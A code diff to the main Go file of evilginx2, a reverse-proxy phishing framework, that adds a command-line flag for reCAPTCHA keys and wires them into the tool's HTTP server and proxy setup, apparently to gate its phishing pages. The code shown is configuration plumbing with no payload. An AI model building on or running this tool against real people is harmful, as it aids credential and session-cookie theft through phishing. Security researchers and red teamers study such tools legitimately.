@@ -7,6 +7,7 @@ import (
     "os/user"
     "path/filepath"
     "regexp"
+    "strings"
 
     "github.com/kgretzky/evilginx2/core"
     "github.com/kgretzky/evilginx2/database"
@@ -20,6 +21,7 @@ var developer_mode = flag.Bool("developer", false, "Enable developer mode (gener
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var gophish_db = flag.String("g", "", "Full path to gophish database")
 var feed_enabled = flag.Bool("feed", false, "Enable live feed")
+var recaptcha = flag.String("captcha", "", "Recaptcha public/private key seperated by \":\"")
 
 func joinPath(base_path string, rel_path string) string {
     var ret string
@@ -153,16 +155,28 @@ func main() {
 
     ns, _ := core.NewNameserver(cfg)
     ns.Start()
-    hs, _ := core.NewHttpServer()
-    hs.Start()
-
-    crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
-    if err != nil {
-        log.Fatal("certdb: %v", err)
-        return
+    var hs *core.HttpServer
+    var hp *core.HttpProxy
+    var crt_db *core.CertDb
+    if *recaptcha != "" {
+        sep := strings.Split(*recaptcha, ":")
+        hs, _ = core.NewHttpServer(sep[0], sep[1], true)        
+        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
+        if err != nil {
+            log.Fatal("certdb: %v", err)
+            return
+        }
+        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+    } else {
+        hs, _ = core.NewHttpServer("", "", false)
+        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
+        if err != nil {
+            log.Fatal("certdb: %v", err)
+            return
+        }
+        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
     }
-
-    hp, _ := core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled)
+    hs.Start(hp)
     hp.Start()
 
     t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
